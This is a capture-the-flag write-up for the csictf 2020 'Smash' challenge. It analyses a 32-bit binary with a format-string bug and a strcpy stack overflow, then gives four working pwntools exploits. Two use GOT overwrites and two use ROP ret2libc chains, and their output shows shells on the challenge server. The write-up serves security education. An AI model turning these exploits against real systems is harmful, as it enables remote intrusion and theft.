# cisctf 2020

## Smash

> My first C program that says hello, do you want to try it?
>
> `nc chall.csivit.com 30046`
>
> [`hello`](hello)

Tags: _pwn_ _x86_ _remote-shell_ _format-string_ _got-overwrite_ _bof_ _rop_


## Summary

Exploit 1: leak libc (stack) -> GOT(`free` -> `main`) -> GOT(`printf` -> `system`) -> shell

Exploit 2: GOT(`free` -> `main`) -> leak libc (GOT) -> GOT(`printf` -> `system`) -> shell

Exploit 3: BOF -> ROP -> leak libc (GOT) -> _ret2main_ -> BOF -> ROP -> `system` -> shell

Exploit 4: BOF -> ROP -> leak libc (GOT) -> _ret2main_ -> BOF -> ROP -> `execve` -> shell


## Analysis

### Checksec

```
[*] '/pwd/datajerk/csictf2020/smash/hello'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

No shellcode on the stack, but that's about it for mitigations.  Easy GOT overwrite, easy BOF, easy ROP.

    
### Decompile with Ghidra

```c
undefined4 main(void)
{
  char local_11;
  char *local_10;
  size_t local_c;
  
  local_c = 0;
  local_10 = (char *)malloc(0);
  puts("What\'s your name?");
  while( true ) {
    __isoc99_scanf(&DAT_080487dc,&local_11);
    local_c = local_c + 1;
    local_10 = (char *)realloc(local_10,local_c);
    if (local_11 == '\n') break;
    local_10[local_c - 1] = local_11;
  }
  local_10[local_c - 1] = '\0';
  say_hello(local_10);
  free(local_10);
  return 0;
}
```

`main` has nothing really of interest except for an unusual unconstrained input method.  That input is then passed to `say_hello`:

```c
void say_hello(char *param_1)
{
  char local_88 [128];
  
  strcpy(local_88,param_1);
  printf("Hello, ");
  printf(local_88);
  puts("!");
  return;
}
```

Since `strcpy` is used vs `strncpy` (safer), and with no stack protection, then one _could_ smash the stack (see _unusual unconstrained input method_ above).  However, given there's also a format string vulnerability, there are multiple options.

Since this can be done with just format-string exploits, I went with that route.  The attack is pretty simple:

1. Overwrite GOT `free` with `main` for multiple _free_ passes while also leaking a libc address.
2. Overwrite GOT `printf` with `system` for a shell.

To do this, we're going to need a couple of offsets.

The first is the start of `local_88` in the stack:

```bash
# echo '%1$p' | nc chall.csivit.com 30046
What's your name?
Hello, 0x70243125!
```

Just increment the number until you get a match, in this case, `1`, was the first match and the offset (notice how after `Hello, `, the _string_ `%1$p` in hex).

The second offset is a libc address leak; start up `hello` in GDB and set a break point at the second `printf` in `say_hello` (`b *say_hello+58`), then `run`, enter `blah`, and then look at the stack:

```
0xffffd5f4│+0x0000: 0xffffd5f8  →  "blah" ← $esp
0xffffd5f8│+0x0004: "blah"
0xffffd5fc│+0x0008: 0xf7e4d400  →  <realloc+160> leave
0xffffd600│+0x000c: 0x00000010
0xffffd604│+0x0010: 0xf7fe4ff8  →  <_dl_fixup+184> mov edi, eax
0xffffd608│+0x0014: 0x080482f1  →  "realloc"
0xffffd60c│+0x0018: 0xf7faa7a0  →  0x00000000
0xffffd610│+0x001c: 0x0804b168  →  0x00000000
0xffffd614│+0x0020: 0x00021e98
0xffffd618│+0x0024: 0x00000000
0xffffd61c│+0x0028: 0xef101400
0xffffd620│+0x002c: 0x00000001
0xffffd624│+0x0030: 0x00000000
0xffffd628│+0x0034: 0xf7e4c40b  →  <_int_realloc+11> add ebx, 0x15dbf5
0xffffd62c│+0x0038: 0xf7faa000  →  0x001d7d6c
0xffffd630│+0x003c: 0x0804b160  →  "blah"
0xffffd634│+0x0040: 0xf7faa7a0  →  0x00000000
0xffffd638│+0x0044: 0x00000005
0xffffd63c│+0x0048: 0xf7e4d437  →  <realloc+215> add esp, 0x10
0xffffd640│+0x004c: 0x00000010
0xffffd644│+0x0050: 0x080487dc  →  0x00006325 ("%c"?)
0xffffd648│+0x0054: 0xffffd684  →  0x0804b160  →  "blah"
0xffffd64c│+0x0058: 0x00000000
0xffffd650│+0x005c: 0x00000010
0xffffd654│+0x0060: 0x00000010
0xffffd658│+0x0064: 0xf7faa7a0  →  0x00000000
0xffffd65c│+0x0068: 0x0804b158  →  0x00000000
0xffffd660│+0x006c: 0xffffd698  →  0x00000000
0xffffd664│+0x0070: 0xf7feae20  →  <_dl_runtime_resolve+16> pop edx
0xffffd668│+0x0074: 0xf7e4d369  →  <realloc+9> add ebx, 0x15cc97
0xffffd66c│+0x0078: 0x0804a000  →  0x08049f08  →  0x00000001
0xffffd670│+0x007c: 0xf7faa000  →  0x001d7d6c
```

The string `blah` at `0xffffd5f8│+0x0004` is the input and is at offset 1 (determined from above).  Down stack there are a number of `realloc` location leaks.  Given the unbounded `strcpy`; something to be aware of (attack is ~60 bytes (measured)).

`ralloac+9` at offset `29` (just count down from `blah`), looks like a good target, so I went with that.  

> BTW, `realloc+215` worked for me locally, but not remotely--differences in libc versions used.  The larger the offset to the libc call (`215` in this case) the greater the probably of difference between libc versions.  The `realloc` just below `blah` is perfect, but that will be overwritten with the format-string exploit.  Because of this I added a 2nd exploit to show how to leak from the GOT as an alternative.

This is all we need.


### Exploit 1: stack leak

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./hello')
context.update(arch='i386',os='linux')

#p = process(binary.path)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = remote('chall.csivit.com', 30046)
libc = ELF('libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so')

offset = 1
libcoffset = 29
```

Initial setup, and defining the offsets.  (libc will be covered below.)

```python
payload  = b'%' + str(libcoffset).encode().rjust(2,b'0') + b'$010p'
payload += fmtstr_payload(offset+len(payload)//4,{binary.got.free:binary.sym.main},numbwritten=10)
p.sendlineafter('name?\n', payload)
p.recvuntil('Hello, ')
realloc_9 = int(p.recv(10),16)
log.info('realloc ' + hex(realloc_9 - 9))
baselibc = realloc_9 - libc.sym.realloc - 9 
log.info('baselibc ' + hex(baselibc))
libc.address = baselibc
```

This first format string will leak libc as well as GOT overwrite `free` with `main` for multiple passes.

The first part of the string is the leak and it works out to be `%29$010p`.  This will have `printf` emit exactly 10 bytes (e.g. `0x12345678`) the address of `realloc+9`.

The second part of the string is the GOT overwrite.  The offset is increased by two because the previous 8-bytes (`%29$010p`) pushes the start of the exploit string down two stack lines.  `numbwritten` set to `10` (the amount `printf` will emit from the `%29$010p` string).  If these are not correctly set, then the exploit will fail (bad math).

The rest of the code just gets the leak and computes the base of libc.

The first time this is run remotely the base of libc will probably be incorrect (i.e. not end in `000`), this is because we do not know the version of libc the task server is running.  Using the output from `log.info('realloc ' + hex(realloc_9 - 9))` we can find the version:

```bash
# libc-database/find realloc 8c0
ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu11.2_amd64)
```

And then update the `libc = ELF(...` line and rerun for a successful 2nd stage:


```python
p.sendlineafter('name?\n', fmtstr_payload(offset,{binary.got.printf:libc.sym.system},numbwritten=0))
```

The second stage is less complicated, no `offset` or `numbwritten` adjustments, just GOT overwrite `printf` with `system` (now that we know the base of libc).

Now we're all set for the final stage:


```python
p.sendlineafter('name?\n', '/bin/sh')
p.recvuntil('not found')

p.interactive()
```

When prompted for `name`, just send `/bin/sh`, since `printf` is really `system`; get a shell, get the flag.

> The `p.recvuntil('not found')` just captures the error from `system` when `Hello, ` is passed to `system`.  Optional, but for cleaner output.

Output:

```bash
# ./exploit.py
[*] '/pwd/datajerk/csictf2020/smash/hello'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chall.csivit.com on port 30046: Done
[*] '/pwd/datajerk/csictf2020/smash/libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] realloc 0xf7e1e8c0
[*] baselibc 0xf7dae000
[*] Switching to interactive mode

$ cat flag.txt
csictf{5up32_m4210_5m45h_8202}
```



### Exploit 2: GOT leak

If leaking from the stack isn't your style or perhaps not working for you, you can leak directly from the GOT:

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./hello')
context.update(arch='i386',os='linux')

#p = process(binary.path)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = remote('chall.csivit.com', 30046)
libc = ELF('libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so')

offset = 1

# 1st stage: free -> main for inf. 'free' rides
p.sendlineafter('name?\n', fmtstr_payload(offset,{binary.got.free:binary.sym.main}))

# 2nd stage: leak libc address
payload  = b'%' + str(offset+2).encode().rjust(2,b'0') + b'$004s'
payload += p32(binary.got.printf)
p.sendlineafter('name?\n', payload)
p.recvuntil('Hello, ')
_ = p.recv(4).lstrip()
printf = u32(_ + (4-len(_))*b'\x00')
log.info('printf ' + hex(printf))
baselibc = printf - libc.sym.printf
log.info('baselibc ' + hex(baselibc))
libc.address = baselibc

# 3nd stage, printf -> system
p.sendlineafter('name?\n', fmtstr_payload(offset,{binary.got.printf:libc.sym.system}))

# 4rd stage, ask for a shell
p.sendlineafter('name?\n', '/bin/sh')
p.recvuntil('not found') # now that printf is system, system('Hello, ') will emit 'not found'

p.interactive()
```

This is the same as the previous exploit except that the GOT overwrite `free` -> `main` is isolated as a discrete step with the libc leak as a new discrete step.  The steps can be combined, but its a bit harder--example [here](https://github.com/datajerk/ctf-write-ups/blob/master/redpwnctf2020/dead-canary/README.md#option-1a--option-1-using-s-to-leak-libc) of how to do that.

The 2nd stage format string will end up being: `%03b$004s\x60\x84\x04\x08`.  When `printf` "prints" this, it will emit the value referenced by `0x8048460` as a 4-byte (`04s`) string.  This is the address of `printf`.

The rest is similar to the previous exploit.

Output:

```bash
# ./exploit2.py
[*] '/pwd/datajerk/csictf2020/smash/hello'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chall.csivit.com on port 30046: Done
[*] '/pwd/datajerk/csictf2020/smash/libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] printf 0xf7de3030
[*] baselibc 0xf7d9a000
[*] Switching to interactive mode

$ cat flag.txt
csictf{5up32_m4210_5m45h_8202}
```


### Exploit 3: All Smash

_What if there were no format-string exploit?_

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./hello')
context.update(arch='i386',os='linux')

p = remote('chall.csivit.com', 30046)
libc = ELF('libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so')

payload  = 0x88 * b'A'
payload += p32(binary.plt.puts)
payload += p32(binary.sym.main)
payload += p32(binary.got.puts)

p.sendlineafter('name?\n', payload)
p.recvuntil('!\n')
_ = p.recv(4)
puts = u32(_ + (4-len(_))*b'\x00')
log.info('puts: ' + hex(puts))
baselibc = puts - libc.sym.puts
log.info('baselibc: ' + hex(baselibc))
libc.address = baselibc

payload  = 0x88 * b'A'
payload += p32(libc.sym.system)
payload += 4 * b'B'
payload += p32(libc.search(b'/bin/sh').__next__())

p.sendlineafter('name?\n', payload)
p.recvuntil('!')
p.interactive()
```

This is not unlike [pwn intended 0x3 remote shell](https://github.com/datajerk/ctf-write-ups/tree/master/csictf2020/small_pwns#exploit-remote-shell), however, this is for 32-bits, and can be brittle (see below).

From the source (above) `local_88` is `0x88` bytes from the return address on the stack (just how Ghidra names locals, quite handy).  So, just send 0x88 _non-null_ bytes, followed by a call to `puts`, then the return to `main` (from `puts`) and the argument to `puts`--the address of, well, `puts`.

This will leak the address of `puts` for computing the base of libc.

After the _ret2main_, do the same BOF, but this time return to `system` and get a shell.

> This did not work on my Ubuntu 18 dev container because `system` ends in `\x00` and `strcpy` stops and the first null, fortunately, the challenge server does not have this version of libc.

Output:

```bash
# ./exploit3.py
[*] '/pwd/datajerk/csictf2020/smash/hello'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chall.csivit.com on port 30046: Done
[*] '/pwd/datajerk/csictf2020/smash/libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts: 0xf7dad150
[*] baselibc: 0xf7d4e000
[*] Switching to interactive mode

$ cat flag.txt
csictf{5up32_m4210_5m45h_8202}
```


### Exploit 4: _nulls?_ null problem

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./hello')
context.update(arch='i386',os='linux')

p = process(binary.path)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#p = remote('chall.csivit.com', 30046)
#libc = ELF('libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so')

payload  = 0x88 * b'A'
payload += p32(binary.plt.puts)
payload += p32(binary.sym.main)
payload += p32(binary.got.puts)

p.sendlineafter('name?\n', payload)
p.recvuntil('!\n')
_ = p.recv(4)
puts = u32(_ + (4-len(_))*b'\x00')
log.info('puts: ' + hex(puts))
baselibc = puts - libc.sym.puts
log.info('baselibc: ' + hex(baselibc))
libc.address = baselibc

payload  = 0x88 * b'A'
payload += p32(libc.sym.execve)
payload += 4 * b'B'
payload += p32(libc.search(b'/bin/sh').__next__())
payload += p32(libc.sym.environ)
payload += p32(libc.sym.environ)

p.sendlineafter('name?\n', payload)
p.recvuntil('!')
p.interactive()
```

In cases, like the above, where `system` has a null in Ubuntu 18's libc preventing `strcpy` from copying the entire exploit, consider `execve` as an alternate.

`execve` requires three parameters: the command, a _word_ array (e.g. `char* argv[]`) of command line parameters, and a second _word_ array (e.g. `char* envp[]`) of environmental variables.  Normally you'd just pass null (`0x0`), however, since `strcpy` terminates the copy at the first null, it's not possible to push this on the stack.  Fortunately, libc provides a `char* envp[]` that can be used for both parameters, `environ`.

Local output (Ubuntu 18 Docker container):

```bash
# ./exploit4.py
[*] '/pwd/datajerk/csictf2020/smash/hello'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/pwd/datajerk/csictf2020/smash/hello': pid 15037
[*] '/lib/i386-linux-gnu/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts: 0xf7e12b40
[*] baselibc: 0xf7dab000
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)
```

Remote output (task server):

```bash
# ./exploit4.py
[*] '/pwd/datajerk/csictf2020/smash/hello'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chall.csivit.com on port 30046: Done
[*] '/pwd/datajerk/csictf2020/smash/libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts: 0xf7d8a150
[*] baselibc: 0xf7d2b000
[*] Switching to interactive mode

$ cat flag.txt
csictf{5up32_m4210_5m45h_8202}
```
